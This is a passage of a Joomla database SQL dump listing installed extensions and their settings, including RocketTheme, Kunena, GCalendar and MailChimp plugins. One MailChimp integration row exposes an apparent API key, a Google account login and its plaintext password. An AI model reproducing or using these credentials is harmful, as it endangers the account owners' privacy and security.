word<\\/li>\\n\\t        <li>26 Themes to choose from<\\/li>\\n\\t        <li>Resizable Editor by dragging the Statusbar<\\/li>\\n\\t        <li>Keyboard shortcuts<\\/li>\\n\\t        <li>Brackets match<\\/li>\\n\\t        <li>Multiple cursors and selections<\\/li>\\n\\t        <li>Vertical Selection<\\/li>\\n\\t        <li>Ability to insert at multiple locations xtd-buttons shortcodes, all at once.<\\/li>\\n\\t        <li>Shortcodes and Universal Tag Insertion<\\/li>\\n\\t        <li>Drag &amp; Drop of text from external applications such as other Browser Tabs\\/windows or Native Applications (Supported on Firefox, Chrome, IE10 and Safari)<\\/li>\\n\\t        <li>Import local files by Drag &amp; Drop directly from your desktop! (Supported on Firefox, Chrome, IE10 and Safari 6+)<\\/li>\\n\\t        <li>And much more!<\\/li>\\n        <\\/ul>\\n        <\\/div>\\n        \",\"group\":\"\"}','{\"autosave-enabled\":\"0\",\"autosave-time\":\"5\",\"theme\":\"fluidvision\",\"font-size\":\"12px\",\"fold-style\":\"markbeginend\",\"use-wrap-mode\":\"free\",\"selection-style\":\"1\",\"highlight-active-line\":\"1\",\"highlight-selected-word\":\"1\",\"show-invisibles\":\"0\",\"show-gutter\":\"1\",\"show-print-margin\":\"1\",\"fade-fold-widgets\":\"0\"}','','',0,'0000-00-00 00:00:00',1,0),(10019,'System - RokBox','plugin','rokbox','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - RokBox\",\"type\":\"plugin\",\"creationDate\":\"March 4, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.7\",\"description\":\"\\n        <div class=\\\"rokbox-description\\\">\\n        <img src=\\\"..\\/plugins\\/system\\/rokbox\\/assets\\/admin\\/images\\/rokbox.jpg\\\" class=\\\"img-padding\\\" \\/><h1>RokBox2<\\/h1>\\n        <p>RokBox2 is a fully responsive modal pop-up plug-in for Joomla.  It displays <strong>images<\\/strong>, <strong>videos<\\/strong>, <strong>embedded widgets<\\/strong>, <strong>Ajax content<\\/strong> and <strong>Joomla modules<\\/strong>.<\\/p>\\n\\n        <p>RokBox2 contains a <strong>Content plug-in<\\/strong> and <strong>Button Editor plug-in<\\/strong>. The <strong>Content plug-in<\\/strong> can auto-generate thumbnails of <strong>local images<\\/strong> that can be used as content for your RokBox2 links. All thumbnails generated are <strong>responsive<\\/strong> so that they can easily adapt to any device. The <strong>Button Editor plug-in<\\/strong> allows for easy creation of RokBox2 style snippets with just a few clicks.<\\/p>\\n        <p>RokBox2 also provides backward compatibility for RokBox1 style <code>{rokbox}<\\/code> syntax.<\\/p>\\n\\n        <h2>Key Features:<\\/h2>\\n        <ul class=\\\"features\\\">\\n            <li>HTML5 and CSS3<\\/li>\\n            <li>Fully Responsive<\\/li>\\n            <li>Auto thumbnails generator<\\/li>\\n            <li>Captions supporting HTML syntax<\\/li>\\n            <li>Ajax Content listener<\\/li>\\n            <li>Multiple media types supported:\\n                <ul class=\\\"features\\\">\\n                    <li>Images: base64 encoded, jpg, gif, png, bmp, webp<\\/li>\\n                    <li>HTML5 Video and Audio<\\/li>\\n                    <li>TwitPic<\\/li>\\n                    <li>Instagram<\\/li>\\n                    <li>YouTube<\\/li>\\n                    <li>Vimeo<\\/li>\\n                    <li>Telly (ex TwitVid)<\\/li>\\n                    <li>Metacafe<\\/li>\\n                    <li>Dailymotion<\\/li>\\n                    <li>Spotify<\\/li>\\n                    <li>Google Maps<\\/li>\\n                <\\/ul>\\n            <\\/li>\\n            <li>Fit\\/Unfit Screen: If an image is too big it gets shrunk to fit the view-port but you can always click the Fit Screen icon to expand it and scroll.<\\/li>\\n            <li>Albums to group related images<\\/li>\\n            <li>Key Bindings for easy navigation: <code>&larr;<\\/code> (Previous), <code>&rarr;<\\/code> (Next), <code>f<\\/code> Fitscreen\\/Unfitscreen, <code>esc<\\/code> Close<\\/li>\\n        <\\/ul>\\n\\n        <p class=\\\"note\\\"><strong>NOTE:<\\/strong> RokBox2 consists of 3 plug-ins: <strong>Content<\\/strong>, <strong>System<\\/strong> and <strong>Editor Button<\\/strong>. Make sure to have a look at all three plug-in manager pages to get an idea of what they do.<\\/p>\\n        <\\/div>\\n        \",\"group\":\"\"}','{\"theme\":\"light\",\"custom-theme\":\"sample\",\"custom-legacy\":\"0\",\"width\":\"640\",\"height\":\"460\",\"transition\":\"Quad.easeOut\",\"duration\":\"200\",\"chase\":\"40\",\"effect\":\"quicksilver\",\"frame-border\":\"20\",\"content-padding\":\"0\",\"arrows-height\":\"35\",\"captions\":\"1\",\"captionsDelay\":\"800\",\"scrolling\":\"0\",\"keyEvents\":\"1\",\"overlay_background\":\"#000000\",\"overlay_opacity\":\"0.85\",\"overlay_duration\":\"200\",\"overlay_transition\":\"Quad.easeInOut\",\"autoplay\":\"true\",\"ytautoplay\":\"0\",\"ythighquality\":\"0\",\"controller\":\"false\",\"bgcolor\":\"#f3f3f3\",\"vimeoColor\":\"00adef\",\"vimeoPortrait\":\"0\",\"vimeoTitle\":\"0\",\"vimeoFullScreen\":\"1\",\"vimeoByline\":\"0\"}','','',0,'0000-00-00 00:00:00',1,0),(10020,'Content - RokBox','plugin','rokbox','content',0,1,1,0,'{\"legacy\":false,\"name\":\"Content - RokBox\",\"type\":\"plugin\",\"creationDate\":\"March 4, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.7\",\"description\":\"\\n        <div class=\\\"rokbox-description\\\">\\n        <img src=\\\"..\\/plugins\\/system\\/rokbox\\/assets\\/admin\\/images\\/rokbox.jpg\\\" class=\\\"img-padding\\\" \\/><h1>RokBox2<\\/h1>\\n        <p>Auto generates thumbnails of <strong>local images<\\/strong> that can be used as content for your RokBox2 links. All thumbnails generated are <strong>responsive<\\/strong> so that they can be easily adapted to any device. RokBox2 Content plugins also provides backward compatibility for the old discontinued RokBox1 that allowed writing snippets through the <code>{rokbox}<\\/code> syntax.<\\/p>\\n\\n        <p class=\\\"note\\\"><strong>NOTE:<\\/strong> RokBox2 comes with 3 plugins: <strong>Content<\\/strong>, <strong>System<\\/strong> and <strong>Editor Button<\\/strong>. Make sure to have a look at all three plugin manager pages to get an idea of what they do.<\\/p>\\n        <\\/div>\\n        \",\"group\":\"\"}','{\"remote_sizes\":\"0\",\"thumb_ext\":\"_thumb\",\"thumb_class\":\"album\",\"thumb_custom\":\"0\",\"thumb_dir\":\"cache\",\"thumb_width\":\"150\",\"thumb_height\":\"100\",\"thumb_quality\":\"90\"}','','',0,'0000-00-00 00:00:00',1,0),(10022,'RokCandy','component','com_rokcandy','',1,1,0,0,'{\"legacy\":false,\"name\":\"RokCandy\",\"type\":\"component\",\"creationDate\":\"November 11, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.1\",\"description\":\"\\n\\t\\tRokCandy is a simple yet powerful macro system for Joomla 1.6.  It provides the ability to create and categorize macros that can be used throughout your site.\\n\\t\",\"group\":\"\"}','{\"forcecache\":\"0\",\"adminenabled\":\"0\",\"editenabled\":\"0\",\"contentPlugin\":\"0\",\"disabled\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(10023,'Button - RokCandy','plugin','rokcandy','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"Button - RokCandy\",\"type\":\"plugin\",\"creationDate\":\"November 11, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.1\",\"description\":\"This is an Editor Button to allow selection of RokCandy macros\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',5,0),(10024,'System - RokCandy','plugin','rokcandy','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - RokCandy\",\"type\":\"plugin\",\"creationDate\":\"November 11, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.1\",\"description\":\"This is the RokCandy system plugin that performs the macro replacement\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',50,0),(10026,'System - RokBooster','plugin','rokbooster','system',0,0,1,0,'{\"legacy\":false,\"name\":\"System - RokBooster\",\"type\":\"plugin\",\"creationDate\":\"February 24, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"1.1.13\",\"description\":\"\\n        \\n        <div class=\\\"booster-description\\\">\\n        <img src=\\\"..\\/plugins\\/system\\/rokbooster\\/assets\\/images\\/rokbooster.jpg\\\" class=\\\"img-padding\\\" \\/><h1>RokBooster<\\/h1>\\n        <p>Increase the speed of your site by enabling the RokBooster plug-in.  This advanced extensions will <strong>compress<\\/strong> and <strong>combine<\\/strong> your <strong>CSS<\\/strong> and <strong>JavaScript<\\/strong> into as few files as possible each.  RokBooster can dramatically reduce the number of HTTP calls a browser has to make, and sending those compressed files GZipped means your pages will load faster with less load on your server.<\\/p>\\n\\n        <h2>Key Features:<\\/h2>\\n        <ul class=\\\"features\\\">\\n            <li>Combine and compress CSS and JavaScript into as few files as possible<\\/li>\\n            <li>GZip compression used to send CSS and JavaScript files<\\/li>\\n            <li>Compress Inline CSS and JavaScript<\\/li>\\n            <li>Customizable cache timeout<\\/li>\\n            <li>Background rendering, so initial file processing won\'t slow your users down<\\/li>\\n            <li>Full page scan allows for non-header JavaScript and CSS to be included<\\/li>\\n            <li>Ability to ignore specific CSS and JavaScript files<\\/li>\\n        <\\/ul>\\n        <p class=\\\"note\\\"><strong>NOTE:<\\/strong> Clearing the Joomla cache will remove the RokBooster compressed cache files causing them to regenerate on the next page hit<\\/p>\\n        <\\/div>\\n        \\n    \",\"group\":\"\"}','{\"cache_time\":\"60\",\"minify_css\":\"1\",\"style_sort\":\"RokBooster_Compressor_Sort_ExternalOnTop\",\"inline_css\":\"1\",\"imported_css\":\"1\",\"minify_js\":\"1\",\"script_sort\":\"RokBooster_Compressor_Sort_ExternalOnTop\",\"inline_js\":\"1\",\"max_data_uri_image_size\":\"21612\",\"convert_css_images\":\"1\",\"convert_page_images\":\"1\",\"ignored_files\":\"\\/media\\/editors\\/tinymce\\/jscripts\\/tiny_mce\\/tiny_mce.js\",\"scan_method\":\"header\",\"use_background_processing\":\"1\",\"disable_for_ie\":\"1\",\"cache_file_permissions\":\"0664\",\"debugloglevel\":\"63\"}','','',0,'0000-00-00 00:00:00',100,0),(10029,'RokSprocket','component','com_roksprocket','',1,1,0,0,'{\"legacy\":false,\"name\":\"RokSprocket\",\"type\":\"component\",\"creationDate\":\"March 11, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.1.1\",\"description\":\"Parent for all PHP based projects\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10030,'RokSprocket Module','module','mod_roksprocket','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokSprocket Module\",\"type\":\"module\",\"creationDate\":\"March 11, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.1.1\",\"description\":\"RokSprocket makes it easy to display content in a dynamic, visual layout.\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10031,'System - RokSprocket','plugin','roksprocket','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - RokSprocket\",\"type\":\"plugin\",\"creationDate\":\"March 11, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.1.1\",\"description\":\"RokSprocket System Plugin\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(10032,'Content - RokInjectModule','plugin','rokinjectmodule','content',0,1,1,0,'{\"legacy\":false,\"name\":\"Content - RokInjectModule\",\"type\":\"plugin\",\"creationDate\":\"April 22, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"1.5\",\"description\":\"RokInjectModule Content Plugin.  Use format [module-{moduleid}] in your article to inject a module. You can also specify a style, eg: [module-28 style=xhtml]\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',5,0),(10034,'rt_chapelco','template','rt_chapelco','',0,1,1,0,'{\"legacy\":false,\"name\":\"rt_chapelco\",\"type\":\"template\",\"creationDate\":\"March 20, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"1.3\",\"description\":\"Parent for all PHP based projects\",\"group\":\"\"}','{\"master\":\"true\"}','','',0,'0000-00-00 00:00:00',0,0),(10057,'Gantry','component','com_gantry','',1,1,1,0,'{\"legacy\":false,\"name\":\"Gantry\",\"type\":\"component\",\"creationDate\":\"April 12, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"4.1.24\",\"description\":\"Gantry Starting Template for Joomla! v4.1.24\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10061,'com_kunena','component','com_kunena','',1,1,0,0,'{\"legacy\":false,\"name\":\"com_kunena\",\"type\":\"component\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"COM_KUNENA_XML_DESCRIPTION\",\"group\":\"\"}','{\"liveupdate\":\"stuck=0\\nlastcheck=1368053837\\nupdatedata=\\\"\\\"{\\\\\\\"supported\\\\\\\":true,\\\\\\\"stuck\\\\\\\":false,\\\\\\\"version\\\\\\\":\\\\\\\"\\\\\\\",\\\\\\\"date\\\\\\\":\\\\\\\"\\\\\\\",\\\\\\\"stability\\\\\\\":\\\\\\\"\\\\\\\",\\\\\\\"downloadURL\\\\\\\":\\\\\\\"\\\\\\\",\\\\\\\"infoURL\\\\\\\":\\\\\\\"\\\\\\\",\\\\\\\"releasenotes\\\\\\\":\\\\\\\"\\\\\\\"}\\\"\\\"\"}','','',0,'0000-00-00 00:00:00',0,0),(10062,'plg_system_kunena','plugin','kunena','system',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_system_kunena\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_SYSTEM_KUNENA_DESC\",\"group\":\"\"}','{\"jcontentevents\":\"0\",\"jcontentevent_target\":\"body\"}','','',0,'0000-00-00 00:00:00',0,0),(10063,'plg_quickicon_kunena','plugin','kunena','quickicon',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_quickicon_kunena\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_QUICKICON_KUNENA_DESC\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10064,'plg_kunena_alphauserpoints','plugin','alphauserpoints','kunena',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_alphauserpoints\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_ALPHAUSERPOINTS_DESCRIPTION\",\"group\":\"\"}','{\"activity\":\"1\",\"avatar\":\"1\",\"profile\":\"1\",\"activity_points_limit\":\"0\"}','','',0,'0000-00-00 00:00:00',1,0),(10065,'plg_kunena_community','plugin','community','kunena',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_community\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_COMMUNITY_DESCRIPTION\",\"group\":\"\"}','{\"access\":\"1\",\"login\":\"1\",\"activity\":\"1\",\"avatar\":\"1\",\"profile\":\"1\",\"private\":\"1\",\"activity_points_limit\":\"0\",\"activity_stream_limit\":\"0\"}','','',0,'0000-00-00 00:00:00',2,0),(10066,'plg_kunena_comprofiler','plugin','comprofiler','kunena',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_comprofiler\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_COMPROFILER_DESCRIPTION\",\"group\":\"\"}','{\"access\":\"1\",\"login\":\"1\",\"activity\":\"1\",\"avatar\":\"1\",\"profile\":\"1\",\"private\":\"1\"}','','',0,'0000-00-00 00:00:00',3,0),(10067,'plg_kunena_gravatar','plugin','gravatar','kunena',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_gravatar\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_GRAVATAR_DESCRIPTION\",\"group\":\"\"}','{\"avatar\":\"1\"}','','',0,'0000-00-00 00:00:00',4,0),(10068,'plg_kunena_uddeim','plugin','uddeim','kunena',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_uddeim\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_UDDEIM_DESCRIPTION\",\"group\":\"\"}','{\"private\":\"1\"}','','',0,'0000-00-00 00:00:00',5,0),(10069,'plg_kunena_kunena','plugin','kunena','kunena',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_kunena\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_KUNENA_DESCRIPTION\",\"group\":\"\"}','{\"avatar\":\"1\",\"profile\":\"1\"}','','',0,'0000-00-00 00:00:00',6,0),(10070,'plg_kunena_joomla','plugin','joomla','kunena',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_kunena_joomla\",\"type\":\"plugin\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"www.kunena.org\",\"authorEmail\":\"Kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"PLG_KUNENA_JOOMLA_25_30_DESCRIPTION\",\"group\":\"\"}','{\"access\":\"1\",\"login\":\"1\"}','','',0,'0000-00-00 00:00:00',7,0),(10071,'quicklogout','component','com_quicklogout','',1,1,0,0,'{\"legacy\":false,\"name\":\"Quick Logout\",\"type\":\"component\",\"creationDate\":\"2014-02-11\",\"author\":\"John Muehleisen\",\"copyright\":\"Copyright (C) 2011. All rights reserved.\",\"authorEmail\":\"john@welcometojoomla.com\",\"authorUrl\":\"www.welcometojoomla.com\",\"version\":\"1.9.2\",\"description\":\"Adds a new menu option type to Joomla to allow a one click logout\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10085,'COM_GCALENDAR','component','com_gcalendar','',1,1,0,0,'{\"legacy\":false,\"name\":\"COM_GCALENDAR\",\"type\":\"component\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\\n\\t\",\"authorEmail\":\"info@digital-peak.com\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"COM_GCALENDAR_XML_DESCRIPTION\",\"group\":\"\"}','{\"google_apps_domain\":\"\",\"timezone\":\"America\\/Iqaluit\",\"gc_cache\":\"1\",\"gc_cache_time\":\"900\",\"show_selection\":\"1\",\"defaultView\":\"month\",\"weekstart\":\"1\",\"weekend\":\"1\",\"calendar_height\":\"0\",\"titleformat_month\":\"F Y\",\"titleformat_week\":\"M j[ Y]{ \'-\'[ M] j o}\",\"titleformat_day\":\"l, M j, Y\",\"titleformat_list\":\"M j Y\",\"timeformat_month\":\"g:i a{ - g:i a}\",\"timeformat_week\":\"g:i a{ - g:i a}\",\"timeformat_day\":\"g:i a{ - g:i a}\",\"timeformat_list\":\"g:i a{ - g:i a}\",\"axisformat\":\"g:i a\",\"description_date_format\":\"m.d.Y\",\"description_time_format\":\"g:i a\",\"description_format\":\"{{#events}}<p>{{date}}<br\\/>{{{description}}}<\\/p>{{\\/events}}\",\"textbefore\":\"\",\"textafter\":\"\",\"show_event_as_popup\":\"1\",\"popup_width\":\"650\",\"popup_height\":\"500\",\"theme\":\"\",\"first_hour\":\"6\",\"min_time\":\"0\",\"max_time\":\"24\",\"event_description_format\":\"1\",\"event_date_format\":\"m.d.Y\",\"event_time_format\":\"g:i a\"}','','',0,'0000-00-00 00:00:00',0,0),(10086,'MOD_GCALENDAR','module','mod_gcalendar','',0,1,0,0,'{\"legacy\":false,\"name\":\"MOD_GCALENDAR\",\"type\":\"module\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\\n\\t\",\"authorEmail\":\"info@digital-peak.com\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"MOD_GCALENDAR_XML_DESCRIPTION\",\"group\":\"\"}','{\"calendarids\":\"\",\"weekstart\":\"1\",\"titleformat_month\":\"M Y\",\"calendar_height\":\"\",\"event_color\":\"135CAE\",\"theme\":\"\",\"@spacer\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(10087,'MOD_GCALENDAR_UPCOMING','module','mod_gcalendar_upcoming','',0,1,0,0,'{\"legacy\":false,\"name\":\"MOD_GCALENDAR_UPCOMING\",\"type\":\"module\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\\n\\t\",\"authorEmail\":\"info@digital-peak.com\\n\\t\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"MOD_GCALENDAR_UPCOMING_XML_DESCRIPTION\",\"group\":\"\"}','{\"calendarids\":\"\",\"max_events\":\"5\",\"order\":\"1\",\"find\":\"\",\"@spacer\":\"\",\"output\":\"\",\"output_grouping\":\"\",\"start_date\":\"\",\"end_date\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(10088,'MOD_GCALENDAR_NEXT','module','mod_gcalendar_next','',0,1,0,0,'{\"legacy\":false,\"name\":\"MOD_GCALENDAR_NEXT\",\"type\":\"module\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\\n\\t\",\"authorEmail\":\"info@digital-peak.com\\n\\t\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"MOD_GCALENDAR_NEXT_XML_DESCRIPTION\",\"group\":\"\"}','{\"calendarids\":\"\",\"style_parameters\":\"\",\"moduleclass_sfx\":\"\",\"offset\":\"0\",\"output\":\"\",\"past_events\":\"1\",\"output_now\":\"\",\"find\":\"\",\"title_filter\":\".*\",\"max_events\":\"10\"}','','',0,'0000-00-00 00:00:00',0,0),(10089,'plg_search_gcalendar','plugin','gcalendar','search',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_search_gcalendar\",\"type\":\"plugin\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\\n\\t\",\"authorEmail\":\"info@digital-peak.com\\n\\t\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"PLG_SEARCH_GCALENDAR_XML_DESCRIPTION\",\"group\":\"\"}','{\"calendarids\":\"\",\"search_limit\":\"50\",\"pastevents\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(10090,'plg_gcalendar_next','plugin','gcalendar_next','content',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_gcalendar_next\",\"type\":\"plugin\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\\n\\t\",\"authorEmail\":\"info@digital-peak.com\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"PLG_GCALENDAR_NEXT_XML_DESCRIPTION\",\"group\":\"\"}','{\"calendarids\":\"\",\"find\":\"\",\"max_events\":\"2\"}','','',0,'0000-00-00 00:00:00',0,0),(10091,'GCalendar','package','pkg_GCalendar','',0,1,1,0,'{\"legacy\":false,\"name\":\"GCalendar\",\"type\":\"package\",\"creationDate\":\"Sep 2013\",\"author\":\"G4J Project\",\"copyright\":\"This extension is released under the GNU\\/GPL License.\",\"authorEmail\":\"info@digital-peak.com\",\"authorUrl\":\"g4j.digital-peak.com\",\"version\":\"3.1.5\",\"description\":\"\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10108,'joomailermailchimpintegration','component','com_joomailermailchimpintegration','',1,1,0,0,'false','{\"params\":{\"MCapi\":\"98fc9749fe455593e62f7a1109e91938-us7\",\"archiveDir\":\"\\/administrator\\/components\\/com_joomailermailchimpintegration\\/archive\",\"gusername\":\"kstorm@blackboxoperations.com\",\"gpw\":\"xer0st@tus\",\"gprofileid\":\"UA-39854015-1\",\"from_name\":\"Hack For Athens\",\"from_email\":\"support@hackforathens.org\",\"reply_email\":\"support@hackforathens.org\",\"confirmation_email\":\"support@hackforathens.org\",\"twitter_name\":\"hackforathens\",\"facebook_link\":\"https:\\/\\/www.facebook.com\\/HackForAthens\",\"myspace_name\":\"\",\"jomsocial_twitter_name\":\"\",\"KloutAPI\":\"\",\"sugar_url\":\"\",\"sugar_name\":\"\",\"sugar_pwd\":\"\",\"highrise_url\":\"\",\"highrise_api_token\":\"\"}}','','',0,'0000-00-00 00:00:00',0,0),(10109,'joomailermailchimpsignup','component','com_joomailermailchimpsignup','',1,1,0,0,'false','{}','','',0,'0000-00-00 00:00:00',0,0),(10110,'System - joomlamailer MailChimp Signup','plugin','joomailermailchimpsignup','system',0,1,1,0,'{\"legacy\":true,\"name\":\"System - joomlamailer MailChimp Signup\",\"type\":\"plugin\",\"creationDate\":\"2011-06-29\",\"author\":\"freakedout\",\"copyright\":\"Copyright (C) 2011 freakedout. All rights reserved.\",\"authorEmail\":\"contact@freakedout.de\",\"authorUrl\":\"www.freakedout.de\",\"version\":\"1.9\",\"description\":\"Plugin to add MailChimp newsletter signup options to Core, Community Builder and JomSocial registration processes\",\"group\":\"\"}','{\"listid\":\"1e4599e8a6\",\"unsubscribe\":\"0\",\"sugar\":\"0\",\"highrise\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(10111,'MailChimp Signup','module','mod_mailchimpsignup','',0,1,0,0,'{\"legacy\":true,\"name\":\"MailChimp Signup\",\"type\":\"module\",\"creationDate\":\"2011-06-29\",\"author\":\"freakedout\",\"copyright\":\"Copyright (C) 2011 freakedout. All rights reserved.\",\"authorEmail\":\"contact@feakedout.de\",\"authorUrl\":\"http:\\/\\/www.freakedout.de\",\"version\":\"1.7\",\"description\":\"This module allows your website visitors to subscribe to your MailChimp newsletter 